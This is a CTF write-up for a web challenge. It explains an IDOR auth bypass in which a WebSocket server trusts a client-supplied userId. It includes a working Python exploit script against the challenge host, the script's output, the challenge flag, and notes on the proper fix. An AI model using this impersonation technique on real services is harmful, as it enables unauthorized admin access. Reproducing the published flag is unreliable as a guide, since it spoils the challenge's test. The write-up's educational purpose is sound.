---
title: "WebSocketSneak"
ctf: "CyberStrike"
date: 2026-07-10
category: web
difficulty: very-hard
points: 450
flag_format: "cyberstrike{...}"
author: "retr0"
---

# WebSocketSneak

## Summary

A real-time analytics dashboard uses WebSocket authentication where the user identity is sent as a post-connection message (`{ type: 'auth', userId: N }`) rather than validated during the HTTP handshake. The server trusts the client-supplied `userId` without any server-side identity binding. Sending `userId: 1` (admin) instead of `userId: 2` (regular user) grants admin access, allowing a `getFlag` request to retrieve the flag.

## Solution

### Step 1: Recon — understand the WebSocket auth flow

The dashboard page reveals the entire protocol:
- Connect to `ws://host/ws`
- Send `{ "type": "auth", "userId": N }` to authenticate
- Send `{ "type": "getFlag" }` to request the flag (admin only)
- UI says: "Admin is user ID 1. You are user ID 2."

The critical flaw: `userId` is **client-supplied** in a WebSocket message after the connection is already open. There is no session token, no handshake-level authentication, and no server-side identity binding.

### Step 2: Exploit — authenticate as admin

```python
#!/usr/bin/env python3
"""WebSocketSneak — IDOR auth bypass: send userId=1 (admin) instead of userId=2."""
import websocket
import json

url = "ws://chal.csc-snist.live:55865/ws"
ws = websocket.create_connection(url, timeout=10)

# Authenticate as admin (userId=1 instead of default userId=2)
ws.send(json.dumps({"type": "auth", "userId": 1}))
print(ws.recv())  # {"type":"authOk","userId":1}

# Request the flag — now authorized as admin
ws.send(json.dumps({"type": "getFlag"}))
print(ws.recv())  # {"type":"flag","flag":"cyberstrike{...}"}

ws.close()
```

### Step 3: Run the exploit

```bash
python3 exploit.py
# {"type":"authOk","userId":1}
# {"type":"flag","flag":"cyberstrike{c6699fb76299b88bc5d0f2bde9592947}"}
```

## Flag

```
cyberstrike{c6699fb76299b88bc5d0f2bde9592947}
```

## Notes

- **IDOR over WebSocket**: The server uses a post-connection `auth` message to set the user's identity, but the `userId` field is entirely client-controlled. There is no session token, JWT, or handshake-level authentication binding the WebSocket connection to a specific user. Anyone can claim any `userId`.
- **Auth flow**: HTTP handshake → WebSocket open → client sends `{ "type": "auth", "userId": N }` → server trusts it and sets the connection's identity to `N`. All subsequent messages are authorized based on this client-supplied identity.
- **Proper fix**: Identity should be established during the HTTP handshake (e.g., via a signed token in the `Sec-WebSocket-Protocol` header or a query parameter with a JWT), not in a post-connection message. If post-connection auth is used, it should validate a server-issued credential, not accept a bare user ID.
